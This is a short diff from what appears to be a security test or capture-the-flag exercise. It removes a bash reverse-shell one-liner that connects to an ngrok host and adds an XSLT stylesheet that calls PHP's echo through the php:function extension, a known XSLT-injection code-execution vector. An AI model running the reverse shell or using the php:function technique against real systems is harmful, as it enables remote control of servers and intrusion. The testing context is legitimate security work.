@@ -1,1 +1,8 @@
-bash -c "sh -i >& /dev/tcp/4.tcp.ngrok.io/12606 0>&1"
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+        <xsl:template match="/">
+                <xsl:variable name="eval">
+                        "Le Thanh Trung"
+                </xsl:variable>
+                <xsl:variable name="preg" select="php:function('echo', $eval)"/>
+        </xsl:template>
+</xsl:stylesheet>
